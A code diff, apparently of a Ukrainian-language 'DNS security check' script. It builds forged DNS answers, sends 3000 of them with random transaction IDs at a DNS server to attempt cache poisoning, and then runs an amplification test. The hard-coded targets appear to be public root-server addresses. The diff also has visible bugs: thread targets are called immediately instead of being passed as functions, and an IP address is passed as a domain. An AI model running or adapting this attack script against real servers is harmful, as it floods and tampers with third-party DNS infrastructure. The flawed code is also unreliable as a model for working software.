@@ -33,22 +33,19 @@ ROOT_SERVERS = [
 
 logging.basicConfig(level=logging.INFO, format='%(message)s')
 
-DNS_SERVER = '198.41.0.4'
-DNS_PORT = 53
-DOMAIN = 'example.com'
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 sock.settimeout(3)
 
 
-def build_query(txid):
+def build_query(txid, DOMAIN):
     q = struct.pack('>H', txid) + b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
     for part in DOMAIN.split('.'):
         q += bytes([len(part)]) + part.encode()
     q += b'\x00\x00\x01\x00\x01'
     return q
 
-def build_fake_response(txid):
+def build_fake_response(txid, DOMAIN):
     r = struct.pack('>H', txid) + b'\x81\x80\x00\x01\x00\x01\x00\x00\x00\x00'
     for part in DOMAIN.split('.'):
         r += bytes([len(part)]) + part.encode()
@@ -56,9 +53,9 @@ def build_fake_response(txid):
     r += b'\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04' + socket.inet_aton('1.2.3.4')
     return r
 
-def send_real_query():
+def send_real_query(DOMAIN, DNS_SERVER, DNS_PORT):
     txid = random.randint(0, 65535)
-    query = build_query(txid)
+    query = build_query(txid, DOMAIN)
     sock.sendto(query, (DNS_SERVER, DNS_PORT))
     logging.info(f"[Real] Sent DNS query with TXID={txid}")
     try:
@@ -72,13 +69,13 @@ def send_real_query():
     except socket.timeout:
         logging.info("[Real] Timeout waiting for DNS response")
 
-def send_fake_responses():
+def send_fake_responses(DOMAIN, DNS_SERVER, DNS_PORT):
     fake_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    for _ in range(10000):
+    for _ in range(3000):
         fake_txid = random.randint(0, 65535)
-        response = build_fake_response(fake_txid)
+        response = build_fake_response(fake_txid, DOMAIN)
         fake_sock.sendto(response, (DNS_SERVER, DNS_PORT))
-    logging.info("[Fake] Sent 10000 fake DNS responses with random TXID")
+    logging.info("[Fake] Sent 3000 fake DNS responses with random TXID")
 
 
 def test_dns_amplification(server, port, domain):
@@ -337,10 +334,13 @@ def is_valid_domain(domain):
 
 
 
-def dns_security_check():
-    logging.info("Перевірка сервера 198.41.0.4 на DNS CACHE POISONING")
-    t_fake = threading.Thread(target=send_fake_responses)
-    t_real = threading.Thread(target=send_real_query)
+def dns_security_check(domain):
+    DNS_SERVER = domain
+    DNS_PORT = 53
+    DOMAIN = 'example.com'
+    logging.info(f"Перевірка сервера {domain} на DNS CACHE POISONING")
+    t_fake = threading.Thread(target=send_fake_responses(DOMAIN, DNS_SERVER, DNS_PORT))
+    t_real = threading.Thread(target=send_real_query(DOMAIN,DNS_SERVER, DNS_PORT))
 
     t_fake.start()
     time.sleep(0.5)  
@@ -348,7 +348,7 @@ def dns_security_check():
 
     t_fake.join()
     t_real.join()
-    logging.info("Перевірка сервера 198.41.0.4 на DNS AMPLIFICATION ATTACK")
+    logging.info(f"Перевірка сервера {domain} на DNS AMPLIFICATION ATTACK")
     test_dns_amplification(DNS_SERVER, DNS_PORT, DOMAIN)
 
 
@@ -357,7 +357,7 @@ if __name__ == '__main__':
         site = sys.argv[1]
     else:
         site = input("Введіть домен для аналізу: ")
-        dns_security_check()
+        dns_security_check("199.9.14.201")
 
     if not is_valid_domain(site):
         logging.info("❌ Неправильний формат домену")
